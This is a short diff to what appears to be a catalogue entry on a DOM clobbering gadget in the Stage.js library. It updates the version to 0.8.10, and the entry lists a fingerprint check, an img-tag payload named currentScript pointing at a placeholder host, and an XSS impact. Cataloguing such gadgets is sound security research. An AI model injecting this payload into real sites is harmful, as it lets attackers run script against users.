@@ -4,7 +4,7 @@
 
 + Library: Stage.js
 + Stars: 2.4K
-+ Version: v1-alpha
++ Version: 0.8.10
 + Fingerprint: `typeof Stage !== 'undefined' && typeof Stage.create === 'function'`
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
 + Impact: XSS
